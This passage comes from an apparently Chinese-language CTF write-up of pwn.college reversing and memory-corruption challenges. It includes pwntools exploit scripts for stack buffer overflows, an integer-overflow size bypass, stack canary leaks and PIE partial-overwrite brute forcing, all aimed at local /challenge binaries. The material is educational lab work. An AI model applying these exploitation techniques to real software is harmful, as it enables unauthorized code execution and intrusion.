class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x80</span>]<br><span class="hljs-title">for</span> i <span class="hljs-keyword">in</span> values:<br>    for j <span class="hljs-keyword">in</span> values_2:<br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(<span class="hljs-title">j</span>)</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>)</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x02</span>)   # <span class="hljs-type">IMM</span> c = 0x01</span><br><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x10</span>)</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>)</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x02</span>)   # <span class="hljs-type">IMM</span> a = 0x01</span><br><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(<span class="hljs-title">i</span>)</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>)    # write | read_code | read_mem</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x20</span>)</span><br><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>)</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x01</span>)</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.append(0<span class="hljs-title">x20</span>)</span><br>        print(<span class="hljs-class"><span class="hljs-keyword">data</span>.hex())</span><br>        try:<br>            res = subprocess.run(command,input=<span class="hljs-class"><span class="hljs-keyword">data</span>,stdout=subprocess.<span class="hljs-type">PIPE</span>, stderr=subprocess.<span class="hljs-type">PIPE</span>,timeout=1)</span><br>            print(len(res.stdout))<br>        except subprocess.<span class="hljs-type">TimeoutExpired</span>:<br>                print(<span class="hljs-string">&quot;timeout&quot;</span>,<span class="hljs-class"><span class="hljs-keyword">data</span>.hex())</span><br>        <span class="hljs-class"><span class="hljs-keyword">data</span>.clear()</span><br></code></pre></td></tr></table></figure>

<p>查看结果，可以找到长度不一致的输入。这个就是我们找到的write和rcx：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">800102100102080120010120</span><br><span class="hljs-number">1075</span><br><span class="hljs-number">010102100102100120010120</span><br><span class="hljs-number">1075</span><br><span class="hljs-number">020102100102100120010120</span><br><span class="hljs-number">1076</span><br><span class="hljs-number">040102100102100120010120</span><br><span class="hljs-number">1075</span><br><span class="hljs-number">200102100102100120010120</span><br><span class="hljs-number">1075</span><br></code></pre></td></tr></table></figure>

<p>那么可以知道，write是<code>0x10</code>，rcx是<code>0x02</code>。然后read也很简单，写一个exp，并且使用interactive，如果这个interactive一直在等待输入，那么说明是<code>read_memory</code>或者<code>read_code</code>。exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/challenge/babyrev-level-22-1&#x27;, &#x27;b *$rebase(0x2345)&#x27;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyrev-level-22-1&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>imm_c = <span class="hljs-number">0x020102</span><br>payload += p32(imm_c, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>imm_a = <span class="hljs-number">0x100002</span><br>payload += p32(imm_a, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_read = <span class="hljs-number">0x201020</span>                         <span class="hljs-comment"># read_mem | read_code | other</span><br>payload += p32(sys_read, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br>sys_exit = <span class="hljs-number">0x010120</span><br>payload += p32(sys_exit, endianness=<span class="hljs-string">&quot;big&quot;</span>)[<span class="hljs-number">1</span>:]<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br><span class="hljs-comment"># for i in range(50):</span><br><span class="hljs-comment">#     print(p.readline())</span><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure>

<p>最终确定，read_mem和read_code是<code>20</code>和<code>08</code>之中的。</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">JMP:</span> <span class="hljs-number">01</span><br><span class="hljs-symbol">IMM:</span> <span class="hljs-number">02</span><br><span class="hljs-symbol">SYS:</span> <span class="hljs-number">20</span>		|	open:<span class="hljs-number">04</span>	| <span class="hljs-number">40</span>	exit:<span class="hljs-number">01</span>		<span class="hljs-keyword">sleep</span>:<span class="hljs-number">02</span>	write:<span class="hljs-number">10</span>	read:<span class="hljs-number">08</span>|<span class="hljs-number">20</span><br><span class="hljs-symbol">STK:</span> <span class="hljs-number">80</span><br><span class="hljs-symbol">STM:</span> <span class="hljs-number">08</span><br><span class="hljs-symbol">LDM:</span> <span class="hljs-number">04</span>|<span class="hljs-number">40</span><br><span class="hljs-symbol">ADD:</span> <span class="hljs-number">04</span>|<span class="hljs-number">40</span><br><span class="hljs-symbol">CMP:</span> <span class="hljs-number">10</span><br>-------------------------------------<br><span class="hljs-symbol">a:</span> <span class="hljs-number">10</span><br><span class="hljs-symbol">b:</span> <span class="hljs-number">04</span><br><span class="hljs-symbol">c:</span> <span class="hljs-number">02</span><br><span class="hljs-symbol">d:</span> <span class="hljs-number">01</span>|<span class="hljs-number">04</span>|<span class="hljs-number">20</span>|<span class="hljs-number">80</span><br><span class="hljs-symbol">s:</span> <span class="hljs-number">01</span>|<span class="hljs-number">04</span>|<span class="hljs-number">20</span>|<span class="hljs-number">80</span><br><span class="hljs-symbol">i:</span> <span class="hljs-number">08</span><br><span class="hljs-symbol">f:</span> <span class="hljs-number">01</span>|<span class="hljs-number">04</span>|<span class="hljs-number">20</span>|<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>

<p>最后，即可使用Shellcode的爆破。依次去试出来。</p>
<p>这里发现了一个错误…因为一开始错误的认为Open是0x40导致后面的exp一直出不来。最后试了一下0x4出来了。因此如果open有问题，那么就也进行一个尝试即可。</p>
<h3 id="Intermediate-Memory-Errors"><a href="#Intermediate-Memory-Errors" class="headerlink" title="Intermediate Memory Errors"></a>Intermediate Memory Errors</h3><blockquote>
<p>前面的level应该是太简单而删除了。直接从Level4.0开始的。</p>
</blockquote>
<h4 id="level4-0-1"><a href="#level4-0-1" class="headerlink" title="level4.0"></a>level4.0</h4><p>直接运行这个level后看到： <strong>stack pointer points to 0x7ffe1d045370</strong>。也就是<code>rsp</code>指向<code>0x7ffe1d045370</code></p>
<p><strong>base pointer points to 0x7ffe1d045400</strong>。 说明<code>rbp</code>指向<code>0x7ffe1d045400</code></p>
<p><strong>he input buffer begins at 0x7ffe1d0453a0</strong>。 说明输入从<code>0x7ffe1d0453a0</code>开始</p>
<p>起始，都不重要。它给的信息确实很多，告诉我们总共需要覆盖112个字节的数据，然后其中104个字节是填充，后面8个字节是返回地址。通过IDA直接能够拿到win()函数的偏移地址。但是IDA里反汇编发现大于82是不行的，而且输入是以<code>%i</code>进行的，可以尝试输入-1。也就是<code>0xffffffff</code>。可以通过栈看到的。然后就能发送超过82字节的数据。最后能够发现win函数的地址（不管是题目的tips还是IDA都能看到），这样exp一下就出来了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/challenge/babymem-level-4-0&#x27;, &#x27;b main&#x27;)</span><br>p = process(<span class="hljs-string">&#x27;/challenge/babymem-level-4-0&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>size = <span class="hljs-string">b&#x27;-1&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>,size)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">104</span><br>payload += p64(<span class="hljs-number">0x4016a9</span>)<br><span class="hljs-built_in">print</span>(payload)<br>p.sendlineafter(<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>,payload)<br><span class="hljs-comment"># for i in range(100):</span><br><span class="hljs-built_in">print</span>(p.recvall())  <br><span class="hljs-comment"># p.interactive()</span><br>p.close()<br></code></pre></td></tr></table></figure>

<h4 id="level4-1-1"><a href="#level4-1-1" class="headerlink" title="level4.1"></a>level4.1</h4><p>这道题现在就是不会打印出栈的信息了。可以通过gdb调试查看栈的信息。</p>
<p>因为都是带符号的，所以win()函数在哪可以通过b win知道。然后cyclic 256，生成的串直接给目标程序。size还是-1。然后发生段错误的时候，gdb能够知道ret的是哪个子串。最后通过<code>cyclic -l &#39;jaabkaab&#39;</code>，知道padding的长度。exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/challenge/babymem-level-4-1&#x27;, &#x27;b main&#x27;)</span><br>p = process(<span class="hljs-string">&#x27;/challenge/babymem-level-4-1&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>size = <span class="hljs-string">b&#x27;-1&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>,size)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">136</span><br>payload += p64(<span class="hljs-number">0x401685</span>)<br><span class="hljs-built_in">print</span>(payload)<br>p.sendlineafter(<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>,payload)<br><span class="hljs-comment"># for i in range(100):</span><br><span class="hljs-built_in">print</span>(p.recvall())  <br><span class="hljs-comment"># p.interactive()</span><br>p.close()<br></code></pre></td></tr></table></figure>

<h4 id="level5-0-1"><a href="#level5-0-1" class="headerlink" title="level5.0"></a>level5.0</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">In</span> [<span class="hljs-number">1</span>]: <span class="hljs-number">0xFFFFFFFF</span>&amp;(<span class="hljs-number">0x7ffffffb</span> *  <span class="hljs-number">0x7ffffffc</span>)<br><span class="hljs-keyword">Out</span>[<span class="hljs-number">1</span>]: <span class="hljs-number">2147483668</span><br><br><span class="hljs-keyword">In</span> [<span class="hljs-number">2</span>]: <span class="hljs-number">0xFFFFFFFF</span>&amp;(<span class="hljs-number">0x7ffffffb</span> *  <span class="hljs-number">0x7ffffffd</span>)<br><span class="hljs-keyword">Out</span>[<span class="hljs-number">2</span>]: <span class="hljs-number">15</span><br><br><span class="hljs-keyword">In</span> [<span class="hljs-number">3</span>]: <span class="hljs-number">0x7ffffffb</span> *  <span class="hljs-number">0x7ffffffd</span><br><span class="hljs-keyword">Out</span>[<span class="hljs-number">3</span>]: <span class="hljs-number">4611686001247518735</span><br></code></pre></td></tr></table></figure>

<p>两个很大的正数，相乘可以是一个很小的数。而最后相乘的时候因为第一个数强制转换为64位的数，因此到read那儿又是一个很大的数。</p>
<p>这两个数分别为<code>2147483643,2147483645</code>。因此输入，即可绕过前面的验证，且到最后依然是一个很大的数。因此exp就很好写了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/challenge/babymem-level-4-1&#x27;, &#x27;b main&#x27;)</span><br>p = process(<span class="hljs-string">&#x27;/challenge/babymem-level-5-0&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>number = <span class="hljs-string">b&#x27;2147483643&#x27;</span><br>size = <span class="hljs-string">b&#x27;2147483645&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&#x27;send: &#x27;</span>, number)<br>p.sendlineafter(<span class="hljs-string">&#x27;record: &#x27;</span>, size)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">56</span><br>payload += p64(<span class="hljs-number">0x401edc</span>)<br><span class="hljs-built_in">print</span>(payload)<br>p.sendlineafter(<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>,payload)<br><span class="hljs-comment"># for i in range(100):</span><br><span class="hljs-built_in">print</span>(p.recvall())  <br><span class="hljs-comment"># p.interactive()</span><br>p.close()<br></code></pre></td></tr></table></figure>

<h4 id="level5-1-1"><a href="#level5-1-1" class="headerlink" title="level5.1"></a>level5.1</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x40178f</span> &lt;challenge+<span class="hljs-number">460</span>&gt;    ret    &lt;<span class="hljs-number">0</span>x6261616362616162&gt;<br></code></pre></td></tr></table></figure>

<p>没啥好说的，还是计算padding就能过。</p>
<h4 id="level9-0-1"><a href="#level9-0-1" class="headerlink" title="level9.0"></a>level9.0</h4><p>这一关PIE和Canary都开了</p>
<blockquote>
<p>中间关卡应该也是被删了。直接来到了level9.0</p>
</blockquote>
<p>这道题有一个变量n来帮助跳过canary，然后PIE的话，偏移不变，那么我们爆破返回地址的最后两个字节即可。exp：</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br># context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>,terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>])<br># p = gdb.debug(<span class="hljs-string">&#x27;/challenge/babymem-level-9-0&#x27;</span>, <span class="hljs-string">&#x27;b challenge&#x27;</span>)<br>for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem-level-9-0&#x27;</span>)<br>    payload = b<span class="hljs-string">&#x27;&#x27;</span><br>    # number = b<span class="hljs-string">&#x27;2147483643&#x27;</span><br>    size = b<span class="hljs-string">&#x27;58&#x27;</span><br>    # p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>, number)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>, size)<br>    payload += b<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p8(<span class="hljs-number">55</span>)+ p8(<span class="hljs-number">0x53</span>) + p8(<span class="hljs-number">0x1a</span>)<br>    # payload += p64(<span class="hljs-number">0x4014c4</span>)<br>    <br>    p.sendlineafter(<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>,payload)<br><br>    out=p.recvall()<br>    p.close()<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;pwn&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        break<br>    # print(p.recvall())  <br>    # p.interactive()<br>print(out.decode())<br></code></pre></td></tr></table></figure>

<p>通过debug我们可以看到填充的第37个字节是变量n，然后后续就是两个地址，这两个是偏移地址。但是不是win函数的地址，而是win函数中flag_open的地址。这样我们就不需要考虑win函数的参数问题，从而能够直接拿到flag了。</p>
<h4 id="level9-1-1"><a href="#level9-1-1" class="headerlink" title="level9.1"></a>level9.1</h4><p>通过gdb知道，size的地址为<code>0x7ffe2199ed88</code>，buf的首地址为<code>0x7ffe2199eda0</code>。经过调试后发现n为覆盖的第25个字节。随后找ret地址。以及win函数中open的地址。（通过IDA会更快）</p>
<p>ret地址在<code>0x7ffe2199edd8</code>，那么需要让n&#x3D;55，然后win中的open地址为：<code>0x00005ffe18dad457</code></p>
<p>而ret的main地址为<code>0x5ffe18dad76b</code>。因此可以确定最后爆破的四位可以为<code>0xd457</code>。</p>
<h4 id="level10-0-1"><a href="#level10-0-1" class="headerlink" title="level10.0"></a>level10.0</h4><p>flag存在input_buf后面，然后最后又会有一个<code>you said</code>，把我们输入到memory中的内容打印出来。我们只需要不覆盖flag，并且把flag与input_buf中间的<code>\0</code>都覆盖掉。那么就会顺带把flag打印出来。</p>
<h4 id="level10-1-1"><a href="#level10-1-1" class="headerlink" title="level10.1"></a>level10.1</h4><p>flag_buf: <code>0x7ffd2f64dc91</code></p>
<p>input_buf:<code>0x7ffd2f64dc30</code></p>
<p>差距为<code>0x61</code>，因此直接cyclic 97，然后输入即可。</p>
<h4 id="level11-0-1"><a href="#level11-0-1" class="headerlink" title="level11.0"></a>level11.0</h4><p>这道题，别用cyclic，直接用pwntools脚本，然后<code>payload = b&#39;a&#39;*32768</code></p>
<h4 id="level11-1-1"><a href="#level11-1-1" class="headerlink" title="level11.1"></a>level11.1</h4><p>flag_buf : <code>0x77f299049000</code></p>
<p>input_buf : <code>0x77f299041000</code></p>
<p>脚本都没改…我怀疑我是不是走捷径了…但是这样做出来好像也没问题。就是yan课上所讲的东西。</p>
<h4 id="level12-0-1"><a href="#level12-0-1" class="headerlink" title="level12.0"></a>level12.0</h4><p>最后四位<code>0x23EC</code>，我们要做的是，通过覆盖canary的最低位的两位<code>0x00</code>，然后使得能够把canary泄露出来。再REPEAT后，使用泄露的canary覆盖原来的canary使其不变。最后覆盖ret_addr就行，并且覆盖ret_addr的最后两个字节进行爆破。最后的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/challenge/babymem-level-9-1&#x27;, &#x27;b challenge&#x27;)</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem-level-12-0&#x27;</span>)<br>    payload = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-comment"># number = b&#x27;2147483643&#x27;</span><br>    size = <span class="hljs-string">b&#x27;25&#x27;</span><br>    <span class="hljs-comment"># p.sendlineafter(&#x27;size: &#x27;, number)</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>, size)<br>    payload += <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">19</span><br>    <span class="hljs-comment"># payload += p64(0x4014c4)</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>,payload)<br>    substr = <span class="hljs-string">b&#x27;You said: REPEAT&#x27;</span><br>    out = p.recvuntil(<span class="hljs-string">b&#x27;aaaaaaaaaaaaaaaaaaa&#x27;</span>)<br>    canary = u64(p8(<span class="hljs-number">0x00</span>) + p.recv(<span class="hljs-number">7</span>))<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:------------------&quot;</span>, <span class="hljs-built_in">hex</span>(canary))<br>    size = <span class="hljs-string">b&#x27;42&#x27;</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>, size)<br>    <span class="hljs-comment"># pause()</span><br>    <span class="hljs-comment"># gdb.attach(p)</span><br>    payload = <span class="hljs-string">b&#x27;&#x27;</span><br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">24</span> + p64(canary) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p16(<span class="hljs-number">0x23EC</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>,payload)<br>    out = p.recvall()<br>    p.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;pwn&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(out)<br>p.interactive()<br><span class="hljs-comment"># print(out.decode())</span><br></code></pre></td></tr></table></figure>



<h4 id="level12-1-1"><a href="#level12-1-1" class="headerlink" title="level12.1"></a>level12.1</h4><p>win中的open偏移为<code>0x13D0</code></p>
<p>用gdb调试出偏移地址，当然也可以用IDA看偏移地址。</p>
<p>最后exp还是上一题的。改一改偏移即可。</p>
<h4 id="level13-0-1"><a href="#level13-0-1" class="headerlink" title="level13.0"></a>level13.0</h4><p>这题，发现flag依然在input_buf后面的可写memory中，因此依然是覆盖到flag，然后泄露出flag即可。</p>
<h4 id="level13-1-1"><a href="#level13-1-1" class="headerlink" title="level13.1"></a>level13.1</h4><p>gdb调试一下，查看flag地址：<code>0x7ffe29d119f8</code>，查看input_buf的地址：<code>0x7ffe29d11980</code></p>
<p>算出padding：<code>0xf8-0x80 = 120</code></p>
<p>然后就能泄露flag了。</p>
<h4 id="level14-0-1"><a href="#level14-0-1" class="headerlink" title="level14.0"></a>level14.0</h4><p>这道题，题目提示有东西没有被初始化。然后在栈上发现了残留的canary。然后算偏移就行了。尝试在gdb中调试查看到是在challenge中使得我们Repeat后的栈空间残留下来canary。不过不重要了，记住一点：栈复用是有可能存在残留数据可利用的。</p>
<p>exp:</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs autoit">from pwn import *<br><span class="hljs-meta"># context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>,terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>])</span><br><span class="hljs-meta"># p = gdb.debug(<span class="hljs-string">&#x27;/challenge/babymem-level-9-1&#x27;</span>, <span class="hljs-string">&#x27;b challenge&#x27;</span>)</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem-level-14-0&#x27;</span>)<br>    <span class="hljs-meta">#payload = b<span class="hljs-string">&#x27;&#x27;</span></span><br>    <span class="hljs-meta"># number = b<span class="hljs-string">&#x27;2147483643&#x27;</span></span><br>    size = b<span class="hljs-string">&#x27;57&#x27;</span><br>    <span class="hljs-meta"># p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>, number)</span><br>    <span class="hljs-meta"># pause()</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>, size)<br>    payload = b<span class="hljs-string">&#x27;REPEAT&#x27;</span> + b<span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">51</span>)<br>    <span class="hljs-meta"># payload += p64(0x4014c4)</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>,payload)<br><br>    out = p.recvuntil(b<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">51</span>))<br>    canary = u64(p8(<span class="hljs-number">0x00</span>) + p.recv(<span class="hljs-number">7</span>))<br><br>    print(<span class="hljs-string">&quot;canary:------------------&quot;</span>, <span class="hljs-built_in">hex</span>(canary))<br>    size = b<span class="hljs-string">&#x27;346&#x27;</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>, size)<br>    payload = b<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-meta"># pause()</span><br>    payload += b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x148</span> + p64(canary) + b<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p16(<span class="hljs-number">0xBEFB</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;bytes)!\n&#x27;</span>,payload)<br>    out = p.recvall()<br>    p.close()<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;pwn&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        <span class="hljs-built_in">break</span><br>print(out) <br><span class="hljs-meta"># p.interactive()</span><br><span class="hljs-meta"># print(out.decode())</span><br></code></pre></td></tr></table></figure>

